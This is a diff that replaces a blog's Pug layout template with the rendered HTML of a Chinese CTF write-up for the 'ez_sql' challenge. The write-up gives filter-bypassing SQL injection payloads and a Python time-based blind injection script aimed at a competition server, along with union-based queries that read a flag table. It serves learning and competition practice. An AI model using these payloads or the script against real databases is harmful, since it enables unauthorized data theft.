@@ -1,107 +1,48 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HNCTF]ez_sql | Boogiepop Don't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Don't Laugh" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HNCTF]ez_sql</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-10-05T15:30:59.993Z" id="date"> 2022-10-05</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2022-10-06T12:48:09.609Z" id="updated"> 2022-10-06</time></div></span></div></div><hr><div id="post-content"><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221005233241890.png" alt="image-20221005233241890"></p>
+<p>页面是一个查询界面,输入1：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221005233329408.png" alt="image-20221005233329408"></p>
+<p>我感到有点悬念，经过测试发现ban了and,sleep,extractvalue,updatexml,空格,information，#，-</p>
+<p>测试发现可以使用<code>benchmark(500000,md5(&#39;test&#39;)</code>进行延时，尝试输入payload：<code>id=1&#39;/**/or/**/if(2&gt;1,(select/**/benchmark(500000,md5(&#39;test&#39;))),1)=&#39;1</code>发现可以延时，之后就写了一个盲注脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#AUthor:@Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">payload=<span class="string">&quot;1&#x27;/**/or/**/if(2&gt;1,(select/**/benchmark(1500000,md5(&#x27;test&#x27;))),1)=&#x27;1&quot;</span></span><br><span class="line">url=<span class="string">&#x27;http://43.143.7.97:28004/index.php&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)//<span class="number">2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:<span class="string">f&quot;0&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(a)/**/from/**/(select/**/(1)a/**/union/**/select/**/*/**/from/**/ctftraining.flag)d),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(select/**/benchmark(500000,md5(&#x27;test&#x27;))),0)=&#x27;1&quot;</span></span><br><span class="line">            <span class="comment"># &quot;id&quot;:f&quot;1&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;ctftraining&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select/**/benchmark(500000,md5(&#x27;test&#x27;))),0)=&#x27;1&quot;</span></span><br><span class="line">            <span class="comment"># &quot;id&quot;:f&quot;1&#x27;/**/or/**/if(ascii(substr((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select/**/benchmark(500000,md5(&#x27;test&#x27;))),0)=&#x27;1&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="built_in">print</span>(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.3</span>:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
-block content
-  -
-    const prev = page.prev
-    const next = page.next
-    const dateConf = theme.post.date
-    const updatedConf = theme.post.updated
-    const excerptConf = theme.post.excerpt
-    const reward = theme.post.reward
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-    const countWord = theme.post.count === true && wordcount !== undefined ? wordcount(page.content) : null
-    const countTime = theme.post.time === true && min2read !== undefined ? min2read(page.content) : null
-  #post-bg
-    #post-title
-      h1= page.title
-      if (dateConf || updatedConf) && page.published
-        #post-info
-          - var first = true
-          if dateConf
-            span #{__('post.posted')}
-              div.control
-                time(datetime=page.date.toJSON())#date
-                  = ' ' + date(page.date, date_format)
-            - first = false
-          if updatedConf
-            if !first
-              br
-            span #{__('post.edited')}
-              div.control
-                time(datetime=page.updated.toJSON())#updated
-                  = ' ' + date(page.updated, date_format)
-            - first = false
-          if countWord
-            if !first
-              br
-            span #{__('post.countTotal')}
-              div.control #{countWord}
-            - first = false
-          if countTime
-            if !first
-              br
-            span #{__('post.timeTotal')}
-              div.control #{countTime} #{__('post.timeUnit')}
-    hr
-    #post-content
-      if excerptConf || encrypted
-        != page.content
-      else
-        != page.more
-      #paginator!= paginator()
-    #post-footer
-      if prev || next
-        - let fix = ""
-        if prev === undefined
-          - fix = "justify-content: flex-end"
-        if next === undefined
-          - fix = "justify-content: flex-start"
-        #pages(style=fix)
-          if prev !== undefined
-            .footer-link(style="width: 50%;text-align:right;border-right:1px #fe2 solid")
-              a(href=url_for(prev.path))
-                |← Next
-                = ' ' + prev.title
-          if next !== undefined
-            .footer-link(style="width: 50%;right:1px;border-left:1px #fe2 solid")
-              a(href=url_for(next.path))
-                = next.title + ' '
-                |Prev →
-    if reward
-      details#reward
-        summary #{__('post.reward')}
-        each imgSrc, pay in reward
-          div
-            span #{pay}
-            br
-            img(src=config.root + imgSrc)
-    -
-      let count = (theme.valine.enable === true) +
-                  (theme.gitalk.enable === true) +
-                  (theme.waline.enable === true)
-    if page.comments && count
-      #comments
-        if count > 0
-          .selector
-            if theme.valine.enable === true
-              button.valine-sel
-            if theme.gitalk.enable === true
-              button.gitalk-sel
-            if theme.waline.enable === true
-              button.waline-sel
-        if theme.valine.enable === true
-          #valine
-        if theme.gitalk.enable === true
-          #gitalk
-        if theme.waline.enable === true
-          #waline
+<p>慢慢跑就出来了</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>听大大说这一题其实不用盲注就可以了，还是我太笨了哈哈哈，好像说是有回显的，我回去测试了一下，发现确实如此：</p>
+<p><code>id=1&#39;/**/union/**/select/**/1,2,3/**/where/**/1=&#39;1</code>输入这个后可以发现：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221005233914867.png" alt="image-20221005233914867"></p>
+<p>有他妈的回显，鉴定成功我是个傻逼</p>
+<p><code>id=1&#39;/**/union/**/select/**/1,2,(select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats)/**/where/**/1=&#39;1</code></p>
+<p>爆出数据库，由于我踩过坑所以知道flag在其他数据库：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221005234027652.png" alt="image-20221005234027652"></p>
+<p>继续爆表、</p>
+<p><code>id=1&#39;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#39;ctftraining</code></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221005234132866.png" alt="	"></p>
+<p>最后爆字段即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/1=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-block aside-block
-  - 
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-  if (tocContent.length > 0)
-    #toc-div(style=encrypted !== undefined?"display:none":"")
-      h1 #{__('post.index')}
-      |!{tocContent}
+
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221005234626365.png" alt="image-20221005234626365"></p>
+<p>结束~</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/10/06/CTFSHOW-SSRF/">← Next CTFSHOW-SSRF</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/10/04/CTFSHOW-SSTI/">CTFSHOW-SSTI Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">非预期解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">预期解</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
